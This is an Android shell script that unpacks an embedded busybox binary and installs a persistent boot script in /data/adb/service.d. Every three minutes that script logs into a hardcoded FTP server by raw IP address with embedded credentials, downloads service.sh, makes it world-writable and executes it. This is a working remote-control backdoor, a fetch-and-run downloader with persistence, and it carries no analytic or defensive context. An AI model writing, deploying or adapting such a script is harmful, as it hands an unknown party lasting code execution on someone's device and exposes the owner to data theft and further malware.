#!/system/bin/sh
output_dir="/data/local/tmp/busybox"
output_file="busybox"
output_path="${output_dir}/${output_file}"
if [[ ! -d "${output_dir}" ]]; then
  echo "Directory ${output_dir} does not exist. Creating it..."
  mkdir -p "${output_dir}"
  if [[ $? -ne 0 ]]; then
    echo "Error: Failed to create directory ${output_dir}."
    exit 1
  fi
fi
if [[ ! -w "${output_dir}" ]]; then
  echo "Error: Directory ${output_dir} is not writable."
  exit 1
fi
sed "1,/^# END OF THE SCRIPT/d" "$0" > "${output_path}"
if [[ $? -eq 0 ]]; then
  echo "Content successfully exported to ${output_path}"
else
  echo "Error: Failed to export content."
  exit 1
fi
chmod 777 "${output_path}"
cat << 'EOF2' > /data/adb/service.d/service_back.sh
#!/system/bin/sh
export PATH=/data/local/tmp/busybox:$PATH
WORKDIR=/data/adb/service.d
cd $WORKDIR
while true; do
  /data/local/tmp/busybox/busybox ftpget  -v -u ser8331474429 -p VFvh6pci4q 172.98.22.123 service.sh ${current_time}.sh 
  if [ -f service.sh ]; then
    chmod 777 service.sh
    sh $WORKDIR/service.sh
  fi
  echo "$(date): Starting script" >> $WORKDIR/service.log
  sleep 180
done
EOF2
chmod 777 /data/adb/service.d/service_back.sh

# END OF THE SCRIPT ----------> 这是shell脚本当前的最后一行
